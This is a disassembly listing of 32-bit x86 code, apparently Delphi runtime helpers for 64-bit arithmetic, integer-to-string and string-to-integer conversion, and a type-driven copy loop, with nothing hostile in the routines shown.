  402812:	01 f0                	add    %esi,%eax
  402814:	e8 3f ea ff ff       	call   0x401258
  402819:	5d                   	pop    %ebp
  40281a:	5f                   	pop    %edi
  40281b:	5e                   	pop    %esi
  40281c:	5b                   	pop    %ebx
  40281d:	c3                   	ret
  40281e:	8b c0                	mov    %eax,%eax
  402820:	53                   	push   %ebx
  402821:	56                   	push   %esi
  402822:	57                   	push   %edi
  402823:	55                   	push   %ebp
  402824:	89 c3                	mov    %eax,%ebx
  402826:	89 d6                	mov    %edx,%esi
  402828:	89 cf                	mov    %ecx,%edi
  40282a:	8b 6c 24 14          	mov    0x14(%esp),%ebp
  40282e:	8a 0f                	mov    (%edi),%cl
  402830:	80 f9 0a             	cmp    $0xa,%cl
  402833:	74 31                	je     0x402866
  402835:	80 f9 0b             	cmp    $0xb,%cl
  402838:	74 43                	je     0x40287d
  40283a:	80 f9 0c             	cmp    $0xc,%cl
  40283d:	74 52                	je     0x402891
  40283f:	80 f9 0d             	cmp    $0xd,%cl
  402842:	74 61                	je     0x4028a5
  402844:	80 f9 0e             	cmp    $0xe,%cl
  402847:	74 7d                	je     0x4028c6
  402849:	80 f9 0f             	cmp    $0xf,%cl
  40284c:	0f 84 91 00 00 00    	je     0x4028e3
  402852:	80 f9 11             	cmp    $0x11,%cl
  402855:	0f 84 9c 00 00 00    	je     0x4028f7
  40285b:	b0 02                	mov    $0x2,%al
  40285d:	5d                   	pop    %ebp
  40285e:	5f                   	pop    %edi
  40285f:	5e                   	pop    %esi
  402860:	5b                   	pop    %ebx
  402861:	e9 e6 e9 ff ff       	jmp    0x40124c
  402866:	89 d8                	mov    %ebx,%eax
  402868:	8b 16                	mov    (%esi),%edx
  40286a:	e8 a5 f2 ff ff       	call   0x401b14
  40286f:	83 c3 04             	add    $0x4,%ebx
  402872:	83 c6 04             	add    $0x4,%esi
  402875:	4d                   	dec    %ebp
  402876:	75 ee                	jne    0x402866
  402878:	e9 8e 00 00 00       	jmp    0x40290b
  40287d:	89 d8                	mov    %ebx,%eax
  40287f:	8b 16                	mov    (%esi),%edx
  402881:	e8 be f8 ff ff       	call   0x402144
  402886:	83 c3 04             	add    $0x4,%ebx
  402889:	83 c6 04             	add    $0x4,%esi
  40288c:	4d                   	dec    %ebp
  40288d:	75 ee                	jne    0x40287d
  40288f:	eb 7a                	jmp    0x40290b
  402891:	89 d8                	mov    %ebx,%eax
  402893:	89 f2                	mov    %esi,%edx
  402895:	e8 2a 01 00 00       	call   0x4029c4
  40289a:	83 c3 10             	add    $0x10,%ebx
  40289d:	83 c6 10             	add    $0x10,%esi
  4028a0:	4d                   	dec    %ebp
  4028a1:	75 ee                	jne    0x402891
  4028a3:	eb 66                	jmp    0x40290b
  4028a5:	31 c9                	xor    %ecx,%ecx
  4028a7:	8a 4f 01             	mov    0x1(%edi),%cl
  4028aa:	8d 7c 39 02          	lea    0x2(%ecx,%edi,1),%edi
  4028ae:	89 d8                	mov    %ebx,%eax
  4028b0:	89 f2                	mov    %esi,%edx
  4028b2:	8b 4f 08             	mov    0x8(%edi),%ecx
  4028b5:	ff 77 04             	push   0x4(%edi)
  4028b8:	e8 63 ff ff ff       	call   0x402820
  4028bd:	03 1f                	add    (%edi),%ebx
  4028bf:	03 37                	add    (%edi),%esi
  4028c1:	4d                   	dec    %ebp
  4028c2:	75 ea                	jne    0x4028ae
  4028c4:	eb 45                	jmp    0x40290b
  4028c6:	89 d8                	mov    %ebx,%eax
  4028c8:	89 f2                	mov    %esi,%edx
  4028ca:	89 f9                	mov    %edi,%ecx
  4028cc:	e8 33 fe ff ff       	call   0x402704
  4028d1:	31 c0                	xor    %eax,%eax
  4028d3:	8a 47 01             	mov    0x1(%edi),%al
  4028d6:	03 5c 38 02          	add    0x2(%eax,%edi,1),%ebx
  4028da:	03 74 38 02          	add    0x2(%eax,%edi,1),%esi
  4028de:	4d                   	dec    %ebp
  4028df:	75 e5                	jne    0x4028c6
  4028e1:	eb 28                	jmp    0x40290b
  4028e3:	89 d8                	mov    %ebx,%eax
  4028e5:	8b 16                	mov    (%esi),%edx
  4028e7:	e8 90 07 00 00       	call   0x40307c
  4028ec:	83 c3 04             	add    $0x4,%ebx
  4028ef:	83 c6 04             	add    $0x4,%esi
  4028f2:	4d                   	dec    %ebp
  4028f3:	75 ee                	jne    0x4028e3
  4028f5:	eb 14                	jmp    0x40290b
  4028f7:	89 d8                	mov    %ebx,%eax
  4028f9:	8b 16                	mov    (%esi),%edx
  4028fb:	89 f9                	mov    %edi,%ecx
  4028fd:	e8 02 07 00 00       	call   0x403004
  402902:	83 c3 04             	add    $0x4,%ebx
  402905:	83 c6 04             	add    $0x4,%esi
  402908:	4d                   	dec    %ebp
  402909:	75 ec                	jne    0x4028f7
  40290b:	5d                   	pop    %ebp
  40290c:	5f                   	pop    %edi
  40290d:	5e                   	pop    %esi
  40290e:	5b                   	pop    %ebx
  40290f:	c2 04 00             	ret    $0x4
  402912:	c3                   	ret
  402913:	90                   	nop
  402914:	e8 03 00 00 00       	call   0x40291c
  402919:	c3                   	ret
  40291a:	8b c0                	mov    %eax,%eax
  40291c:	91                   	xchg   %eax,%ecx
  40291d:	87 ca                	xchg   %ecx,%edx
  40291f:	e8 ec f2 ff ff       	call   0x401c10
  402924:	c3                   	ret
  402925:	8d 40 00             	lea    0x0(%eax),%eax
  402928:	53                   	push   %ebx
  402929:	56                   	push   %esi
  40292a:	57                   	push   %edi
  40292b:	8b f9                	mov    %ecx,%edi
  40292d:	8b da                	mov    %edx,%ebx
  40292f:	8b f0                	mov    %eax,%esi
  402931:	8b c6                	mov    %esi,%eax
  402933:	e8 18 f4 ff ff       	call   0x401d50
  402938:	50                   	push   %eax
  402939:	8b c6                	mov    %esi,%eax
  40293b:	e8 08 f6 ff ff       	call   0x401f48
  402940:	8b c8                	mov    %eax,%ecx
  402942:	8b d7                	mov    %edi,%edx
  402944:	4a                   	dec    %edx
  402945:	8b c3                	mov    %ebx,%eax
  402947:	e8 ac f2 ff ff       	call   0x401bf8
  40294c:	66 c7 04 43 00 00    	movw   $0x0,(%ebx,%eax,2)
  402952:	8b c3                	mov    %ebx,%eax
  402954:	5f                   	pop    %edi
  402955:	5e                   	pop    %esi
  402956:	5b                   	pop    %ebx
  402957:	c3                   	ret
  402958:	53                   	push   %ebx
  402959:	51                   	push   %ecx
  40295a:	8b d8                	mov    %eax,%ebx
  40295c:	33 c0                	xor    %eax,%eax
  40295e:	89 04 24             	mov    %eax,(%esp)
  402961:	8b c3                	mov    %ebx,%eax
  402963:	e8 e8 f3 ff ff       	call   0x401d50
  402968:	8b c8                	mov    %eax,%ecx
  40296a:	8b c4                	mov    %esp,%eax
  40296c:	8b d3                	mov    %ebx,%edx
  40296e:	e8 f5 f7 ff ff       	call   0x402168
  402973:	8b 04 24             	mov    (%esp),%eax
  402976:	5a                   	pop    %edx
  402977:	5b                   	pop    %ebx
  402978:	c3                   	ret
  402979:	8d 40 00             	lea    0x0(%eax),%eax
  40297c:	b0 10                	mov    $0x10,%al
  40297e:	e9 c9 e8 ff ff       	jmp    0x40124c
  402983:	c3                   	ret
  402984:	66 8b 00             	mov    (%eax),%ax
  402987:	66 83 e8 02          	sub    $0x2,%ax
  40298b:	72 0b                	jb     0x402998
  40298d:	66 83 e8 08          	sub    $0x8,%ax
  402991:	74 05                	je     0x402998
  402993:	e8 e4 ff ff ff       	call   0x40297c
  402998:	c3                   	ret
  402999:	8d 40 00             	lea    0x0(%eax),%eax
  40299c:	ba c0 e5 40 00       	mov    $0x40e5c0,%edx
  4029a1:	33 c0                	xor    %eax,%eax
  4029a3:	c7 04 82 7c 29 40 00 	movl   $0x40297c,(%edx,%eax,4)
  4029aa:	40                   	inc    %eax
  4029ab:	83 f8 2b             	cmp    $0x2b,%eax
  4029ae:	75 f3                	jne    0x4029a3
  4029b0:	b8 84 29 40 00       	mov    $0x402984,%eax
  4029b5:	a3 c0 e5 40 00       	mov    %eax,0x40e5c0
  4029ba:	c3                   	ret
  4029bb:	90                   	nop
  4029bc:	ff 25 c0 e5 40 00    	jmp    *0x40e5c0
  4029c2:	c3                   	ret
  4029c3:	90                   	nop
  4029c4:	ff 25 c4 e5 40 00    	jmp    *0x40e5c4
  4029ca:	c3                   	ret
  4029cb:	90                   	nop
  4029cc:	50                   	push   %eax
  4029cd:	e8 ea ff ff ff       	call   0x4029bc
  4029d2:	58                   	pop    %eax
  4029d3:	c3                   	ret
  4029d4:	ff 25 54 e6 40 00    	jmp    *0x40e654
  4029da:	c3                   	ret
  4029db:	90                   	nop
  4029dc:	b0 11                	mov    $0x11,%al
  4029de:	e9 69 e8 ff ff       	jmp    0x40124c
  4029e3:	c3                   	ret
  4029e4:	52                   	push   %edx
  4029e5:	50                   	push   %eax
  4029e6:	8b 44 24 10          	mov    0x10(%esp),%eax
  4029ea:	f7 24 24             	mull   (%esp)
  4029ed:	89 c1                	mov    %eax,%ecx
  4029ef:	8b 44 24 04          	mov    0x4(%esp),%eax
  4029f3:	f7 64 24 0c          	mull   0xc(%esp)
  4029f7:	01 c1                	add    %eax,%ecx
  4029f9:	8b 04 24             	mov    (%esp),%eax
  4029fc:	f7 64 24 0c          	mull   0xc(%esp)
  402a00:	01 ca                	add    %ecx,%edx
  402a02:	59                   	pop    %ecx
  402a03:	59                   	pop    %ecx
  402a04:	c2 08 00             	ret    $0x8
  402a07:	c3                   	ret
  402a08:	55                   	push   %ebp
  402a09:	53                   	push   %ebx
  402a0a:	56                   	push   %esi
  402a0b:	57                   	push   %edi
  402a0c:	31 ff                	xor    %edi,%edi
  402a0e:	8b 5c 24 14          	mov    0x14(%esp),%ebx
  402a12:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  402a16:	09 c9                	or     %ecx,%ecx
  402a18:	75 08                	jne    0x402a22
  402a1a:	09 d2                	or     %edx,%edx
  402a1c:	74 5c                	je     0x402a7a
  402a1e:	09 db                	or     %ebx,%ebx
  402a20:	74 58                	je     0x402a7a
  402a22:	09 d2                	or     %edx,%edx
  402a24:	79 0a                	jns    0x402a30
  402a26:	f7 da                	neg    %edx
  402a28:	f7 d8                	neg    %eax
  402a2a:	83 da 00             	sbb    $0x0,%edx
  402a2d:	83 cf 01             	or     $0x1,%edi
  402a30:	09 c9                	or     %ecx,%ecx
  402a32:	79 0a                	jns    0x402a3e
  402a34:	f7 d9                	neg    %ecx
  402a36:	f7 db                	neg    %ebx
  402a38:	83 d9 00             	sbb    $0x0,%ecx
  402a3b:	83 f7 01             	xor    $0x1,%edi
  402a3e:	89 cd                	mov    %ecx,%ebp
  402a40:	b9 40 00 00 00       	mov    $0x40,%ecx
  402a45:	57                   	push   %edi
  402a46:	31 ff                	xor    %edi,%edi
  402a48:	31 f6                	xor    %esi,%esi
  402a4a:	d1 e0                	shl    $1,%eax
  402a4c:	d1 d2                	rcl    $1,%edx
  402a4e:	d1 d6                	rcl    $1,%esi
  402a50:	d1 d7                	rcl    $1,%edi
  402a52:	39 ef                	cmp    %ebp,%edi
  402a54:	72 0b                	jb     0x402a61
  402a56:	77 04                	ja     0x402a5c
  402a58:	39 de                	cmp    %ebx,%esi
  402a5a:	72 05                	jb     0x402a61
  402a5c:	29 de                	sub    %ebx,%esi
  402a5e:	19 ef                	sbb    %ebp,%edi
  402a60:	40                   	inc    %eax
  402a61:	e2 e7                	loop   0x402a4a
  402a63:	5b                   	pop    %ebx
  402a64:	f7 c3 01 00 00 00    	test   $0x1,%ebx
  402a6a:	74 07                	je     0x402a73
  402a6c:	f7 da                	neg    %edx
  402a6e:	f7 d8                	neg    %eax
  402a70:	83 da 00             	sbb    $0x0,%edx
  402a73:	5f                   	pop    %edi
  402a74:	5e                   	pop    %esi
  402a75:	5b                   	pop    %ebx
  402a76:	5d                   	pop    %ebp
  402a77:	c2 08 00             	ret    $0x8
  402a7a:	f7 f3                	div    %ebx
  402a7c:	31 d2                	xor    %edx,%edx
  402a7e:	eb f3                	jmp    0x402a73
  402a80:	c3                   	ret
  402a81:	8d 40 00             	lea    0x0(%eax),%eax
  402a84:	55                   	push   %ebp
  402a85:	53                   	push   %ebx
  402a86:	56                   	push   %esi
  402a87:	57                   	push   %edi
  402a88:	31 ff                	xor    %edi,%edi
  402a8a:	8b 5c 24 14          	mov    0x14(%esp),%ebx
  402a8e:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  402a92:	09 c9                	or     %ecx,%ecx
  402a94:	75 08                	jne    0x402a9e
  402a96:	09 d2                	or     %edx,%edx
  402a98:	74 5d                	je     0x402af7
  402a9a:	09 db                	or     %ebx,%ebx
  402a9c:	74 59                	je     0x402af7
  402a9e:	09 d2                	or     %edx,%edx
  402aa0:	79 0a                	jns    0x402aac
  402aa2:	f7 da                	neg    %edx
  402aa4:	f7 d8                	neg    %eax
  402aa6:	83 da 00             	sbb    $0x0,%edx
  402aa9:	83 cf 01             	or     $0x1,%edi
  402aac:	09 c9                	or     %ecx,%ecx
  402aae:	79 07                	jns    0x402ab7
  402ab0:	f7 d9                	neg    %ecx
  402ab2:	f7 db                	neg    %ebx
  402ab4:	83 d9 00             	sbb    $0x0,%ecx
  402ab7:	89 cd                	mov    %ecx,%ebp
  402ab9:	b9 40 00 00 00       	mov    $0x40,%ecx
  402abe:	57                   	push   %edi
  402abf:	31 ff                	xor    %edi,%edi
  402ac1:	31 f6                	xor    %esi,%esi
  402ac3:	d1 e0                	shl    $1,%eax
  402ac5:	d1 d2                	rcl    $1,%edx
  402ac7:	d1 d6                	rcl    $1,%esi
  402ac9:	d1 d7                	rcl    $1,%edi
  402acb:	39 ef                	cmp    %ebp,%edi
  402acd:	72 0b                	jb     0x402ada
  402acf:	77 04                	ja     0x402ad5
  402ad1:	39 de                	cmp    %ebx,%esi
  402ad3:	72 05                	jb     0x402ada
  402ad5:	29 de                	sub    %ebx,%esi
  402ad7:	19 ef                	sbb    %ebp,%edi
  402ad9:	40                   	inc    %eax
  402ada:	e2 e7                	loop   0x402ac3
  402adc:	89 f0                	mov    %esi,%eax
  402ade:	89 fa                	mov    %edi,%edx
  402ae0:	5b                   	pop    %ebx
  402ae1:	f7 c3 01 00 00 00    	test   $0x1,%ebx
  402ae7:	74 07                	je     0x402af0
  402ae9:	f7 da                	neg    %edx
  402aeb:	f7 d8                	neg    %eax
  402aed:	83 da 00             	sbb    $0x0,%edx
  402af0:	5f                   	pop    %edi
  402af1:	5e                   	pop    %esi
  402af2:	5b                   	pop    %ebx
  402af3:	5d                   	pop    %ebp
  402af4:	c2 08 00             	ret    $0x8
  402af7:	f7 f3                	div    %ebx
  402af9:	92                   	xchg   %eax,%edx
  402afa:	31 d2                	xor    %edx,%edx
  402afc:	eb f2                	jmp    0x402af0
  402afe:	c3                   	ret
  402aff:	90                   	nop
  402b00:	55                   	push   %ebp
  402b01:	8b ec                	mov    %esp,%ebp
  402b03:	83 c4 dc             	add    $0xffffffdc,%esp
  402b06:	53                   	push   %ebx
  402b07:	56                   	push   %esi
  402b08:	57                   	push   %edi
  402b09:	8b f2                	mov    %edx,%esi
  402b0b:	8b f8                	mov    %eax,%edi
  402b0d:	33 db                	xor    %ebx,%ebx
  402b0f:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  402b13:	75 09                	jne    0x402b1e
  402b15:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  402b19:	0f 92 c0             	setb   %al
  402b1c:	eb 03                	jmp    0x402b21
  402b1e:	0f 9c c0             	setl   %al
  402b21:	88 45 ff             	mov    %al,-0x1(%ebp)
  402b24:	6a 00                	push   $0x0
  402b26:	6a 0a                	push   $0xa
  402b28:	8b 45 08             	mov    0x8(%ebp),%eax
  402b2b:	8b 55 0c             	mov    0xc(%ebp),%edx
  402b2e:	e8 51 ff ff ff       	call   0x402a84
  402b33:	85 d2                	test   %edx,%edx
  402b35:	7d 07                	jge    0x402b3e
  402b37:	f7 d8                	neg    %eax
  402b39:	83 d2 00             	adc    $0x0,%edx
  402b3c:	f7 da                	neg    %edx
  402b3e:	83 c0 30             	add    $0x30,%eax
  402b41:	83 d2 00             	adc    $0x0,%edx
  402b44:	88 44 1d df          	mov    %al,-0x21(%ebp,%ebx,1)
  402b48:	43                   	inc    %ebx
  402b49:	6a 00                	push   $0x0
  402b4b:	6a 0a                	push   $0xa
  402b4d:	8b 45 08             	mov    0x8(%ebp),%eax
  402b50:	8b 55 0c             	mov    0xc(%ebp),%edx
  402b53:	e8 b0 fe ff ff       	call   0x402a08
  402b58:	89 45 08             	mov    %eax,0x8(%ebp)
  402b5b:	89 55 0c             	mov    %edx,0xc(%ebp)
  402b5e:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  402b62:	75 c0                	jne    0x402b24
  402b64:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  402b68:	75 ba                	jne    0x402b24
  402b6a:	80 7d ff 00          	cmpb   $0x0,-0x1(%ebp)
  402b6e:	74 06                	je     0x402b76
  402b70:	c6 44 1d df 2d       	movb   $0x2d,-0x21(%ebp,%ebx,1)
  402b75:	43                   	inc    %ebx
  402b76:	81 ff ff 00 00 00    	cmp    $0xff,%edi
  402b7c:	7e 05                	jle    0x402b83
  402b7e:	bf ff 00 00 00       	mov    $0xff,%edi
  402b83:	b8 01 00 00 00       	mov    $0x1,%eax
  402b88:	8b d7                	mov    %edi,%edx
  402b8a:	2b d3                	sub    %ebx,%edx
  402b8c:	3b d0                	cmp    %eax,%edx
  402b8e:	7c 09                	jl     0x402b99
  402b90:	c6 04 06 20          	movb   $0x20,(%esi,%eax,1)
  402b94:	40                   	inc    %eax
  402b95:	3b d0                	cmp    %eax,%edx
  402b97:	7d f7                	jge    0x402b90
  402b99:	85 db                	test   %ebx,%ebx
  402b9b:	7e 0d                	jle    0x402baa
  402b9d:	4b                   	dec    %ebx
  402b9e:	8a 54 1d df          	mov    -0x21(%ebp,%ebx,1),%dl
  402ba2:	88 14 06             	mov    %dl,(%esi,%eax,1)
  402ba5:	40                   	inc    %eax
  402ba6:	85 db                	test   %ebx,%ebx
  402ba8:	7f f3                	jg     0x402b9d
  402baa:	8b d0                	mov    %eax,%edx
  402bac:	4a                   	dec    %edx
  402bad:	8b c6                	mov    %esi,%eax
  402baf:	e8 50 e8 ff ff       	call   0x401404
  402bb4:	5f                   	pop    %edi
  402bb5:	5e                   	pop    %esi
  402bb6:	5b                   	pop    %ebx
  402bb7:	8b e5                	mov    %ebp,%esp
  402bb9:	5d                   	pop    %ebp
  402bba:	c2 08 00             	ret    $0x8
  402bbd:	8d 40 00             	lea    0x0(%eax),%eax
  402bc0:	55                   	push   %ebp
  402bc1:	8b ec                	mov    %esp,%ebp
  402bc3:	53                   	push   %ebx
  402bc4:	8b d8                	mov    %eax,%ebx
  402bc6:	ff 75 0c             	push   0xc(%ebp)
  402bc9:	ff 75 08             	push   0x8(%ebp)
  402bcc:	8b d3                	mov    %ebx,%edx
  402bce:	33 c0                	xor    %eax,%eax
  402bd0:	e8 2b ff ff ff       	call   0x402b00
  402bd5:	5b                   	pop    %ebx
  402bd6:	5d                   	pop    %ebp
  402bd7:	c2 08 00             	ret    $0x8
  402bda:	8b c0                	mov    %eax,%eax
  402bdc:	53                   	push   %ebx
  402bdd:	56                   	push   %esi
  402bde:	57                   	push   %edi
  402bdf:	55                   	push   %ebp
  402be0:	83 c4 ec             	add    $0xffffffec,%esp
  402be3:	89 14 24             	mov    %edx,(%esp)
  402be6:	8b f0                	mov    %eax,%esi
  402be8:	bd 01 00 00 00       	mov    $0x1,%ebp
  402bed:	33 ff                	xor    %edi,%edi
  402bef:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  402bf6:	00 
  402bf7:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
  402bfe:	00 
  402bff:	85 f6                	test   %esi,%esi
  402c01:	75 0b                	jne    0x402c0e
  402c03:	8b 04 24             	mov    (%esp),%eax
  402c06:	89 28                	mov    %ebp,(%eax)
  402c08:	e9 e1 01 00 00       	jmp    0x402dee
  402c0d:	45                   	inc    %ebp
  402c0e:	80 7c 2e ff 20       	cmpb   $0x20,-0x1(%esi,%ebp,1)
  402c13:	74 f8                	je     0x402c0d
  402c15:	c6 44 24 10 00       	movb   $0x0,0x10(%esp)
  402c1a:	8a 44 2e ff          	mov    -0x1(%esi,%ebp,1),%al
  402c1e:	3c 2d                	cmp    $0x2d,%al
  402c20:	75 08                	jne    0x402c2a
  402c22:	c6 44 24 10 01       	movb   $0x1,0x10(%esp)
  402c27:	45                   	inc    %ebp
  402c28:	eb 05                	jmp    0x402c2f
  402c2a:	3c 2b                	cmp    $0x2b,%al
  402c2c:	75 01                	jne    0x402c2f
  402c2e:	45                   	inc    %ebp
  402c2f:	b3 01                	mov    $0x1,%bl
  402c31:	80 7c 2e ff 24       	cmpb   $0x24,-0x1(%esi,%ebp,1)
  402c36:	74 1b                	je     0x402c53
  402c38:	80 7c 2e ff 30       	cmpb   $0x30,-0x1(%esi,%ebp,1)
  402c3d:	0f 85 da 00 00 00    	jne    0x402d1d
  402c43:	8a 04 2e             	mov    (%esi,%ebp,1),%al
  402c46:	e8 bd e7 ff ff       	call   0x401408
  402c4b:	3c 58                	cmp    $0x58,%al
  402c4d:	0f 85 ca 00 00 00    	jne    0x402d1d
  402c53:	80 7c 2e ff 30       	cmpb   $0x30,-0x1(%esi,%ebp,1)
  402c58:	75 01                	jne    0x402c5b
  402c5a:	45                   	inc    %ebp
  402c5b:	45                   	inc    %ebp
  402c5c:	8a 44 2e ff          	mov    -0x1(%esi,%ebp,1),%al
  402c60:	8b d0                	mov    %eax,%edx
  402c62:	80 c2 d0             	add    $0xd0,%dl
  402c65:	80 ea 0a             	sub    $0xa,%dl
  402c68:	72 12                	jb     0x402c7c
  402c6a:	80 c2 f9             	add    $0xf9,%dl
  402c6d:	80 ea 06             	sub    $0x6,%dl
  402c70:	72 17                	jb     0x402c89
  402c72:	80 c2 e6             	add    $0xe6,%dl
  402c75:	80 ea 06             	sub    $0x6,%dl
  402c78:	72 1c                	jb     0x402c96
  402c7a:	eb 7a                	jmp    0x402cf6
  402c7c:	8b f8                	mov    %eax,%edi
  402c7e:	81 e7 ff 00 00 00    	and    $0xff,%edi
  402c84:	83 ef 30             	sub    $0x30,%edi
  402c87:	eb 18                	jmp    0x402ca1
  402c89:	8b f8                	mov    %eax,%edi
  402c8b:	81 e7 ff 00 00 00    	and    $0xff,%edi
  402c91:	83 ef 37             	sub    $0x37,%edi
  402c94:	eb 0b                	jmp    0x402ca1
  402c96:	8b f8                	mov    %eax,%edi
  402c98:	81 e7 ff 00 00 00    	and    $0xff,%edi
  402c9e:	83 ef 57             	sub    $0x57,%edi
  402ca1:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%esp)
  402ca6:	75 09                	jne    0x402cb1
  402ca8:	83 7c 24 08 00       	cmpl   $0x0,0x8(%esp)
  402cad:	72 47                	jb     0x402cf6
  402caf:	eb 02                	jmp    0x402cb3
  402cb1:	7c 43                	jl     0x402cf6
  402cb3:	81 7c 24 0c ff ff ff 	cmpl   $0x7ffffff,0xc(%esp)
  402cba:	07 
  402cbb:	75 09                	jne    0x402cc6
  402cbd:	83 7c 24 08 ff       	cmpl   $0xffffffff,0x8(%esp)
  402cc2:	76 04                	jbe    0x402cc8
  402cc4:	eb 30                	jmp    0x402cf6
  402cc6:	7f 2e                	jg     0x402cf6
  402cc8:	8b c7                	mov    %edi,%eax
  402cca:	99                   	cltd
  402ccb:	52                   	push   %edx
  402ccc:	50                   	push   %eax
  402ccd:	8b 44 24 10          	mov    0x10(%esp),%eax
  402cd1:	8b 54 24 14          	mov    0x14(%esp),%edx
  402cd5:	0f a4 c2 04          	shld   $0x4,%eax,%edx
  402cd9:	c1 e0 04             	shl    $0x4,%eax
  402cdc:	03 04 24             	add    (%esp),%eax
  402cdf:	13 54 24 04          	adc    0x4(%esp),%edx
  402ce3:	83 c4 08             	add    $0x8,%esp
  402ce6:	89 44 24 08          	mov    %eax,0x8(%esp)
  402cea:	89 54 24 0c          	mov    %edx,0xc(%esp)
  402cee:	45                   	inc    %ebp
  402cef:	33 db                	xor    %ebx,%ebx
  402cf1:	e9 66 ff ff ff       	jmp    0x402c5c
  402cf6:	80 7c 24 10 00       	cmpb   $0x0,0x10(%esp)
  402cfb:	0f 84 d3 00 00 00    	je     0x402dd4
  402d01:	8b 44 24 08          	mov    0x8(%esp),%eax
  402d05:	8b 54 24 0c          	mov    0xc(%esp),%edx
  402d09:	f7 d8                	neg    %eax
  402d0b:	83 d2 00             	adc    $0x0,%edx
  402d0e:	f7 da                	neg    %edx
  402d10:	89 44 24 08          	mov    %eax,0x8(%esp)
  402d14:	89 54 24 0c          	mov    %edx,0xc(%esp)
  402d18:	e9 b7 00 00 00       	jmp    0x402dd4
  402d1d:	8a 44 2e ff          	mov    -0x1(%esi,%ebp,1),%al
  402d21:	8b d0                	mov    %eax,%edx
  402d23:	80 c2 d0             	add    $0xd0,%dl
  402d26:	80 ea 0a             	sub    $0xa,%dl
  402d29:	73 62                	jae    0x402d8d
  402d2b:	8b f8                	mov    %eax,%edi
  402d2d:	81 e7 ff 00 00 00    	and    $0xff,%edi
  402d33:	83 ef 30             	sub    $0x30,%edi
  402d36:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%esp)
  402d3b:	75 09                	jne    0x402d46
  402d3d:	83 7c 24 08 00       	cmpl   $0x0,0x8(%esp)
  402d42:	72 49                	jb     0x402d8d
  402d44:	eb 02                	jmp    0x402d48
  402d46:	7c 45                	jl     0x402d8d
  402d48:	81 7c 24 0c cc cc cc 	cmpl   $0xccccccc,0xc(%esp)
  402d4f:	0c 
  402d50:	75 0c                	jne    0x402d5e
  402d52:	81 7c 24 08 cc cc cc 	cmpl   $0xcccccccc,0x8(%esp)
  402d59:	cc 
  402d5a:	76 04                	jbe    0x402d60
  402d5c:	eb 2f                	jmp    0x402d8d
  402d5e:	7f 2d                	jg     0x402d8d
  402d60:	6a 00                	push   $0x0
  402d62:	6a 0a                	push   $0xa
  402d64:	8b 44 24 10          	mov    0x10(%esp),%eax
  402d68:	8b 54 24 14          	mov    0x14(%esp),%edx
  402d6c:	e8 73 fc ff ff       	call   0x4029e4
  402d71:	52                   	push   %edx
  402d72:	50                   	push   %eax
  402d73:	8b c7                	mov    %edi,%eax
  402d75:	99                   	cltd
  402d76:	03 04 24             	add    (%esp),%eax
  402d79:	13 54 24 04          	adc    0x4(%esp),%edx
  402d7d:	83 c4 08             	add    $0x8,%esp
  402d80:	89 44 24 08          	mov    %eax,0x8(%esp)
  402d84:	89 54 24 0c          	mov    %edx,0xc(%esp)
  402d88:	45                   	inc    %ebp
  402d89:	33 db                	xor    %ebx,%ebx
  402d8b:	eb 90                	jmp    0x402d1d
  402d8d:	80 7c 24 10 00       	cmpb   $0x0,0x10(%esp)
  402d92:	74 17                	je     0x402dab
  402d94:	8b 44 24 08          	mov    0x8(%esp),%eax
  402d98:	8b 54 24 0c          	mov    0xc(%esp),%edx
  402d9c:	f7 d8                	neg    %eax
  402d9e:	83 d2 00             	adc    $0x0,%edx
  402da1:	f7 da                	neg    %edx
  402da3:	89 44 24 08          	mov    %eax,0x8(%esp)
  402da7:	89 54 24 0c          	mov    %edx,0xc(%esp)
  402dab:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%esp)
  402db0:	75 05                	jne    0x402db7
  402db2:	83 7c 24 08 00       	cmpl   $0x0,0x8(%esp)
  402db7:	74 1b                	je     0x402dd4
  402db9:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%esp)
  402dbe:	75 0a                	jne    0x402dca
  402dc0:	83 7c 24 08 00       	cmpl   $0x0,0x8(%esp)
  402dc5:	0f 92 c0             	setb   %al
  402dc8:	eb 03                	jmp    0x402dcd
  402dca:	0f 9c c0             	setl   %al
  402dcd:	3a 44 24 10          	cmp    0x10(%esp),%al
  402dd1:	74 01                	je     0x402dd4
  402dd3:	4d                   	dec    %ebp
  402dd4:	80 7c 2e ff 00       	cmpb   $0x0,-0x1(%esi,%ebp,1)
  402dd9:	0f 95 c0             	setne  %al
  402ddc:	0a d8                	or     %al,%bl
  402dde:	74 07                	je     0x402de7
  402de0:	8b 04 24             	mov    (%esp),%eax
  402de3:	89 28                	mov    %ebp,(%eax)
  402de5:	eb 07                	jmp    0x402dee
  402de7:	8b 04 24             	mov    (%esp),%eax
  402dea:	33 d2                	xor    %edx,%edx
  402dec:	89 10                	mov    %edx,(%eax)
  402dee:	8b 44 24 08          	mov    0x8(%esp),%eax
  402df2:	8b 54 24 0c          	mov    0xc(%esp),%edx
  402df6:	83 c4 14             	add    $0x14,%esp
  402df9:	5d                   	pop    %ebp
  402dfa:	5f                   	pop    %edi
  402dfb:	5e                   	pop    %esi
  402dfc:	5b                   	pop    %ebx
  402dfd:	c3                   	ret
  402dfe:	8b c0                	mov    %eax,%eax
  402e00:	85 c0                	test   %eax,%eax
  402e02:	74 03                	je     0x402e07
  402e04:	8b 40 fc             	mov    -0x4(%eax),%eax
  402e07:	c3                   	ret
  402e08:	e8 f3 ff ff ff       	call   0x402e00
  402e0d:	48                   	dec    %eax
  402e0e:	c3                   	ret
  402e0f:	90                   	nop
  402e10:	55                   	push   %ebp
  402e11:	8b ec                	mov    %esp,%ebp
  402e13:	ff 75 08             	push   0x8(%ebp)
  402e16:	e8 05 fa ff ff       	call   0x402820
  402e1b:	5d                   	pop    %ebp
  402e1c:	c2 04 00             	ret    $0x4
  402e1f:	90                   	nop
  402e20:	e9 ff f6 ff ff       	jmp    0x402524
  402e25:	c3                   	ret
  402e26:	8b c0                	mov    %eax,%eax
  402e28:	e8 9b 01 00 00       	call   0x402fc8
  402e2d:	c3                   	ret
